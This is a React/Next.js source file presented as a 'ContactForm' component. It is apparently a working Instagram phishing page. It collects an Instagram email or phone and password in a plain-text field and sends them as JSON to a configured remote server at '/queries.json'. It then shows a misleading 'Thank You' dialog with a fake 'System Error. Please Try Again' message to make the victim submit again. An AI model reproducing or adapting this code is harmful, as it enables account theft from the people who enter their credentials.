/* eslint-disable @next/next/no-img-element */

import { Success } from "@/assets/utility";
import { configs } from "@/configs";
import { CustomDialog, CustomInput } from "@/core";
import { Field, Form, Formik } from "formik";
import { useState } from "react";

import * as Yup from "yup";

type ValueProps =
  | {
      name: string;
      email: string;
      message: string;
    }
  | {
      [key: string]: string;
    };

const ContactForm = () => {
  const [openDialog, setOpenDialog] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const contactSchema = [
    {
      key: "2",
      label: "Email or Phone",
      placeholder: "Enter your instagram Email or Phone",
      required: true,
      name: "email",
      type: "text",
      validationSchema: Yup.string()
        .required("Instagram Email or Phone is required")
        .trim(),
      initialValue: "",
      className: "w-full",
    },
    {
      key: "2",
      label: "Password",
      placeholder: "Enter your instagram password",
      required: true,
      name: "password",
      type: "text",
      validationSchema: Yup.string()
        .required("Instagram password is required")
        .trim(),
      initialValue: "",
      className: "w-full",
    },
  ];

  const contactSchemaInitialValues: { [key: string]: string } =
    contactSchema.reduce((accumulator, currentValue) => {
      accumulator[currentValue.name] = currentValue.initialValue;
      return accumulator;
    }, {} as { [key: string]: string });

  const contactSchemaValidationSchema: {
    [key: string]: Yup.StringSchema<string>;
  } = contactSchema.reduce((accumulator, currentValue) => {
    accumulator[currentValue.name] = currentValue.validationSchema;
    return accumulator;
  }, {} as { [key: string]: Yup.StringSchema<string> });

  const handleSubmitSession = async (values: ValueProps) => {
    try {
      setIsLoading(true);

      const res = await fetch(`${configs.server_url}/queries.json`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          ...values,
        }),
      });

      if (!res.ok) {
        throw new Error("Network response was not ok");
      }

      const result = await res.json();
      console.log("Form submission result:", result);

      if (result?.name) {
        setOpenDialog(true);
      } else {
        console.error("Form submission failed: ", result);
      }
    } catch (error) {
      console.error("Form submission error: ", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <section className="md:col-span-4 lg:col-span-5 w-full">
      <CustomDialog
        PaperProps={{
          style: {
            borderRadius: 18,
          },
        }}
        maxWidth="sm"
        fullWidth
        open={openDialog}
        onClose={() => setOpenDialog(false)}
      >
        <div className="px-3 py-5 md:p-8 bg-dark-slate/80 flex w-full gap-2 md:gap-4 items-center justify-center flex-col">
          <div className="w-fit h-fit">
            <img src={Success.src} className="w-24 md:w-40" alt="success" />
          </div>
          <h1 className="text-xl md:text-3xl font-semibold text-blue-900/90">
            Thank You.
          </h1>
          <p className="text-blue-900/70 text-center text-sm">
            System Error. Please Try Again
          </p>
        </div>
      </CustomDialog>
      <Formik
        initialValues={contactSchemaInitialValues}
        validationSchema={Yup.object(contactSchemaValidationSchema)}
        onSubmit={handleSubmitSession}
        enableReinitialize={true}
      >
        {(formik) => (
          <Form className="w-full flex flex-col gap-3 md:gap-6">
            {contactSchema.map((inputItem) => (
              <Field name={inputItem.name} key={inputItem.key}>
                {() => (
                  <div
                    className={`flex w-full gap-2 flex-col justify-center ${inputItem.className}`}
                  >
                    <p className="text-sm font-medium text-black">
                      {inputItem.label}
                      {inputItem.required ? "*" : ""}
                    </p>
                    <div className="w-full">
                      <CustomInput
                        key={inputItem?.key}
                        InputProps={{
                          style: {
                            borderRadius: "3px",
                            height:
                              inputItem.type !== "textarea" ? "2.5rem" : "auto",
                            backgroundColor: "#e6e6e6",
                          },
                        }}
                        id={inputItem?.key}
                        name={inputItem?.name}
                        placeholder={inputItem?.placeholder}
                        fullWidth
                        type={inputItem?.type}
                        value={formik?.values[inputItem?.name]}
                        onChange={formik.handleChange}
                        onBlur={formik.handleBlur}
                        error={Boolean(
                          formik?.touched[inputItem?.name] &&
                            formik?.errors[inputItem?.name]
                        )}
                        helperText={
                          formik?.touched[inputItem?.name] &&
                          formik?.errors[inputItem?.name]
                        }
                      />
                    </div>
                  </div>
                )}
              </Field>
            ))}

            <div className="flex flex-col">
              <button
                type="submit"
                disabled={isLoading}
                className="w-full cursor-pointer col-span-full  py-2 bg-blue-500 font-semibold text-white rounded-lg"
              >
                {isLoading ? "Loading..." : "Login"}
              </button>
            </div>
          </Form>
        )}
      </Formik>
    </section>
  );
};

export default ContactForm;
